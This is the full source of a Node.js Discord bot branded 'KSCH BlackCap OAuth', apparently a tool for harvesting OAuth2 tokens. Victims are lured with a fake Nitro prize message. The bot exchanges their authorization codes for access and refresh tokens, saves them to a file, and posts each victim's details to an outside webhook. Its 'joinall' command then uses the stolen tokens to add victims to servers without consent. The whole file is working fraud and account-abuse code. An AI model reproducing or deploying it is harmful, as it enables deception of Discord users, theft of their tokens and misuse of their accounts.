 
const Discord = require('discord.js');
const client = new Discord.Client({
    intents: 32767
}); 
const config = require("./config");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const axios = require('axios');
const code_channel_logger = config.code_channel_logger;
const redirect_url = config.redirect_url;
const clientid = config.appid;
const clienttoken = config.apptoken;
const webhook_report_url = config.webhook_report_url;



client.on("messageCreate", message=>{
    if(message.channelId === code_channel_logger){
    if(message.author.id === client.user.id)return;
    let code = message.content
    let data = `client_id=${clientid}&client_secret=${clienttoken}&grant_type=authorization_code&code=${code}&redirect_uri=${redirect_url}&scope=identify&guilds`;
      let headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
      }
      axios.post("https://discord.com/api/oauth2/token", data, {
        headers: headers
      }).then(async function(response) {
        let parsed = response.data
        ac_token = parsed.access_token
        rf_token = parsed.refresh_token
const tgg = {headers: {authorization: `${parsed.token_type} ${ac_token}`,}}
    axios.get('https://discord.com/api/v9/users/@me', tgg)
        .then((te) => {
            let efjr = te.data.id
            fs.readFile('./object.json', function (res, req) {
                if (
                    JSON.parse(req).some(
                        (ususu) => ususu.userID === efjr
                    )
                ) {
                    console.log(
                        '[-] ' +
                        te.data.username +
                        '#' +
                        te.data.discriminator
                    )
                    return
                }
                console.log(
                    '[+] ' +
                    te.data.username +
                    '#' +
                    te.data.discriminator
                )
                avatarHASH =
                    'https://cdn.discordapp.com/avatars/' +
                    te.data.id +
                    '/' +
                    te.data.avatar +
                    '.png?size=4096'
                fetch(`${webhook_report_url}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        avatar_url: '',
                        embeds: [
                            {
                                color: 3092790,
                                title:
                                    te.data.username +
                                    '#' +
                                    te.data.discriminator +
                                    ' - ' +
                                    te.data.id,
                                thumbnail: { url: avatarHASH },
                                description:
                                    '```diff\n- New User\n\n- Pseudo: ' +
                                    te.data.username +
                                    '#' +
                                    te.data.discriminator +
                                    '\n\n- ID: ' +
                                    te.data.id +
                                    '```',
                            
                                
                            },
                        ],
                    }),
                }) 

                var papapa = {
                    userID: te.data.id,
                    avatarURL: avatarHASH,
                    username:
                        te.data.username + '#' + te.data.discriminator,
                    access_token: ac_token,
                    refresh_token: rf_token,
                },
                    req = []
                req.push(papapa)
                fs.readFile('./object.json', function (res, req) {
                    var jzjjfj = JSON.parse(req)
                    jzjjfj.push(papapa)
                    fs.writeFile(
                        './object.json',
                        JSON.stringify(jzjjfj),
                        function (eeeeeeeee) {
                            if (eeeeeeeee) {
                                throw eeeeeeeee
                            }
                        }
                    )
                })
            })
        })     
      }).catch(error => {
        if(error){
        return;
        }
      });     
    }
})


client.on("ready", () => {
 
    console.log(`${chalk.blue('KSCH BlackCap OAuth')}\n${chalk.green('->')} Le bot est connecté en tant que [ ${client.user.username} ], il utilise comme prefix : ${config.prefix}\n${chalk.green('->')} L'invite du bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
})



client.on("messageCreate", async (ctx) => {
    if (!ctx.guild || ctx.author.bot) return;
    const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(config.prefix)})\\s*`);
    if (!prefixRegex.test(ctx.content)) return;
    const [, matchedPrefix] = ctx.content.match(prefixRegex);
    const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();



    if (cmd === "wl") {
        if (!config.owners.includes(ctx.author.id)) return;
        switch (args[0]) {
            case "add":
                const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
                if (db.get(`wl_${user.id}`) === null) {
                    db.set(`wl_${user.id}`, true)
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user.username}** has been added to the whitelist`,
                            color: "2F3136"
                        }]
                    })
                } else {
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user.username}** is already whitelist`,
                            color: "2F3136"
                        }]
                    })
                }
                break;
            case "remove":
                const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
                if (db.get(`wl_${user2.id}`) !== null) {
                    db.delete(`wl_${user2.id}`)
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user2.username}** has been removed from the whitelist`,
                            color: "2F3136"
                        }]
                    })
                } else {
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user2.username}** was not whitelist`,
                            color: "2F3136"
                        }]
                    })
                }
                break;
            case "list":
                var content = ""
                const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);

                for (let i in blrank) {
                    if (blrank[i].data === null) blrank[i].data = 0;
                    content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
                }

                ctx.channel.send({
                    embeds: [{
                        title: "Whitelisted Users",
                        description: `${content}`,
                        color: "2F3136",
                    }]
                })
                break;
        }
    }

    if (cmd === "help") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !config.owners.includes(ctx.author.id)) return;
        ctx.channel.send({
            embeds: [{
                color: "2F3136",
                title: '<a:a2f:1039325919313154048> 0auth2 Dashboard',
                description:'<a:checkmark:1039625075441279016>** 0auth2**\n`joinall`, `Users`, `Links`\n\n<a:checkmark:1039625075441279016> **Prefix** `;`\n<:info:997096855143989329> *Message sent to users when they authorized:*\n```You have won Nitro wait 24h to get the code 🎁```',

          }]
        })
    } 
              
              
              

    if (cmd === "links") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !config.owners.includes(ctx.author.id)) return;
        ctx.channel.send({
            embeds: [{
                title: '<:links:996492434278187169> Oauth/Invite:',
                description: `<a:checkmark:1039625075441279016> **Your OAuth2 Link:** ${config.authLink}\n\`\`\`${config.authLink}\`\`\`\n<a:checkmark:1039625075441279016> **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
                color: "2F3136"
            }]
        })
    }
    

    if (cmd === "joinall") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !config.owners.includes(ctx.author.id)) return;
        let msg = await ctx.channel.send({
            content:'**Joining users...**'
           
        })

        fs.readFile('./object.json', async function (err, data) {
            let json = JSON.parse(data);
            let error = 0;
            let success = 0;
            let already_joined = 0;
            for (const i of json) {
                const user = await client.users.fetch(i.userID).catch(() => {});
                if (ctx.guild.members.cache.get(i.userID)) {
                    already_joined++
                }
                await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(err => {
                    error++
                    console.log(err)
                    return;
                })
                success++
            }
            await msg.edit({
                content: `**Joining users...** : \`${success}\``
            })
            await msg.edit({
                embeds: [{
                    title: '<a:a2f:1039325919313154048> 0auth2 Joinall',
                    description: `<:info:997096855143989329> **Already in server** : ${already_joined}\n<a:checkmark:1039625075441279016> **Success**: ${success}\n<a:fail:1039625769854439465> **Error**: ${error}`,
                    color: "2F3136"
                }]
            }).catch(() => {})
        })
    }
     

    if (cmd === "users") {
      
      if (db.get(`wl_${ctx.author.id}`) !== true && !config.owners.includes(ctx.author.id)) return;
      
fs.readFile('./object.json', async function (err, data) {
            return ctx.channel.send({ 
                embeds: [{
                    title: '<a:a2f:1039325919313154048> OAuth2 Users:',
                    description: `There are ${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` members` : `\`${JSON.parse(data).length}\` users in the bot`}\nType command \`links\` to check your OAuth2 link`,
                    color: "2F3136"
                  
                }] 
            })
        })
    }
})


function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

client.login(config.token).catch(() => {
    throw new Error(`TOKEN OR INTENT INVALID`)
})
 